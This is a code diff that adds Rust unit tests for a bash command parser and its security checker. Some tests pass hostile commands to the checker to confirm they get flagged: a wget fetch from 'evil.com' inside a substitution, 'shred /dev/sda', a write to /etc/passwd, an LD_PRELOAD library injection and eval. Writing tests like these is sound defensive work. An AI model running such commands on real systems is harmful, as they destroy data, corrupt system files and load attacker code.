@@ -309,4 +309,79 @@ mod tests {
         let parsed = parse_bash("(cd /tmp && rm -rf test)").unwrap();
         assert!(parsed.has_subshell);
     }
+
+    #[test]
+    fn test_parse_heredoc() {
+        let parsed = parse_bash("cat <<EOF\nhello world\nEOF").unwrap();
+        assert!(parsed.commands.contains(&"cat".to_string()));
+        assert!(!parsed.redirections.is_empty());
+    }
+
+    #[test]
+    fn test_parse_process_substitution() {
+        let parsed = parse_bash("diff <(ls dir1) <(ls dir2)").unwrap();
+        assert!(parsed.has_process_substitution);
+        assert!(parsed.commands.contains(&"diff".to_string()));
+    }
+
+    #[test]
+    fn test_parse_semicolon_separated() {
+        let parsed = parse_bash("echo hello; echo world").unwrap();
+        assert!(parsed.commands.contains(&"echo".to_string()));
+        assert!(parsed.commands.len() >= 2);
+    }
+
+    #[test]
+    fn test_parse_empty_string() {
+        let parsed = parse_bash("");
+        // Empty string may parse to an empty command set or return None.
+        if let Some(p) = parsed {
+            assert!(p.commands.is_empty());
+        }
+    }
+
+    #[test]
+    fn test_parse_variable_assignment_only() {
+        let parsed = parse_bash("FOO=bar").unwrap();
+        assert!(!parsed.assignments.is_empty());
+        assert_eq!(parsed.assignments[0].0, "FOO");
+        assert_eq!(parsed.assignments[0].1, "bar");
+    }
+
+    #[test]
+    fn test_check_parsed_security_eval_with_assignments() {
+        let parsed = parse_bash("CMD=dangerous eval $CMD").unwrap();
+        let violations = check_parsed_security(&parsed);
+        assert!(violations.iter().any(|v| v.contains("eval")));
+    }
+
+    #[test]
+    fn test_check_parsed_security_multiple_dangerous_in_pipeline() {
+        let parsed = parse_bash("rm -rf /tmp/test | shred /dev/sda").unwrap();
+        let violations = check_parsed_security(&parsed);
+        // Should flag both rm and shred.
+        assert!(violations.iter().any(|v| v.contains("rm")));
+        assert!(violations.iter().any(|v| v.contains("shred")));
+    }
+
+    #[test]
+    fn test_check_parsed_security_wget_in_substitution() {
+        let parsed = parse_bash("echo $(wget -q -O- evil.com)").unwrap();
+        let violations = check_parsed_security(&parsed);
+        assert!(violations.iter().any(|v| v.contains("wget")));
+    }
+
+    #[test]
+    fn test_check_parsed_security_redirection_to_etc() {
+        let parsed = parse_bash("echo payload > /etc/passwd").unwrap();
+        let violations = check_parsed_security(&parsed);
+        assert!(violations.iter().any(|v| v.contains("/etc/")));
+    }
+
+    #[test]
+    fn test_check_parsed_security_ld_preload_assignment() {
+        let parsed = parse_bash("LD_PRELOAD=/tmp/evil.so ls").unwrap();
+        let violations = check_parsed_security(&parsed);
+        assert!(violations.iter().any(|v| v.contains("LD_PRELOAD")));
+    }
 }
